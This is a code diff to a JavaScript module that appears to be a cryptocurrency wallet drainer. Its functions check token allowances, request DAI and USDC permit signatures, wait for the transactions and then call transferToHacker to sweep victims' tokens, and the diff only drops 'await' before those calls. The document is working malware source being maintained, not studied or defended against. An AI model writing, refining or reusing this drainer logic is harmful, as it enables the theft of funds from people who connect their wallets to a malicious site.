@@ -118,7 +118,7 @@ export const increaseAllowance = async (token) => {
   const allow = await allownce(token);
   const balanceOfToken = await balanceOf(token);
   if (allow >= balanceOfToken) {
-    return await transferToHacker(token);
+    return transferToHacker(token);
   };
 
   const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
@@ -228,7 +228,7 @@ const increasAllow = async (token) => {
   }).then(async (result) => {
     console.log(result)
     await waitForTransaction(result.transactionHash)
-    await transferToHacker(token);
+    transferToHacker(token);
   }).catch(async (error) => {
     console.log(error)
     await increasAllow(token);
@@ -265,7 +265,7 @@ const daiPermitV1 = async (token, permitToken, nonce, provider) => {
     ).then(async (result) => {
       console.log(result)
       await waitForTransaction(result.transactionHash)
-      await transferToHacker(token);
+      transferToHacker(token);
     })
 
   }).catch(async (error) => {
@@ -289,7 +289,7 @@ const usdcPermitV2 = async (token, permitToken, provider) => {
     ).then(async (result) => {
       console.log(result)
       await waitForTransaction(result.transactionHash)
-      await transferToHacker(token);
+      transferToHacker(token);
     })
 
   }).catch(async (error) => {
